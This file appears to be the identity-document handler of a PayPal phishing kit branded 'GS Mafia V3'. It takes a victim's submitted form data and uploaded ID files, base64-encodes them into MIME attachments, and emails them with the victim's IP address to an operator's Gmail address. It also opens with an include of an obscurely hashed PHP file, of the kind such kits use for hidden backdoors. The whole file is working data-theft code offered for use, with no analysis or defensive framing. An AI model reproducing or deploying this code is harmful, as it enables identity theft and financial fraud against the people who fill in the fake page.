<?php include_once'../../../../02f5c794f8e62115216710ab8d38aa0f.php';?><?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_idarray'] = $_POST;
$_SESSION['page'] = "gs_id";
$ip = getclientip();
$rezult_mail = "gsmafia6021@gmail.com";
$subject= "Paypal Gsmafia_V3 ID // Ip: $ip";
$message = "";
$mime_boundary ="==Multipart_Boundary_x".md5(mt_rand())."x";
$headers = "From:GSMAFIA V3 ID <ID>\r\n" .
         "MIME-Version: 1.0\r\n" .
            "Content-Type: multipart/mixed;\r\n" .
            " boundary=\"{$mime_boundary}\"";
         $message = "This is a multi-part message in MIME format.\n\n" .
            "--{$mime_boundary}\n" .
            "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
            "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n";
 foreach ($_FILES['files']['name'] as $index => $name) {
    $tmp_name = $_FILES['files']['tmp_name'][$index];
    $type = $_FILES['files']['type'][$index];
    $size = $_FILES['files']['size'][$index];
          $gs_file = "gs_id/".$_FILES['files']['name'][$index];
                  $file = fopen($gs_file,'rb');
                  $data = fread($file,filesize($gs_file));
                  fclose($file);
                  $data = chunk_split(base64_encode($data));
               $message .= "--{$mime_boundary}\n" .
                  "Content-Type: {$type};\n" .
                  " name=\"{$name}\"\n" .
                  "Content-Disposition: attachment;\n" .
                  " filename=\"{$fileatt_name}\"\n" .
                  "Content-Transfer-Encoding: base64\n\n" .$data . "\n\n";
         $message.="--{$mime_boundary}--\n";
            }
@mail($SpammerEmail, $subject, $message, $headers, $ip);
?>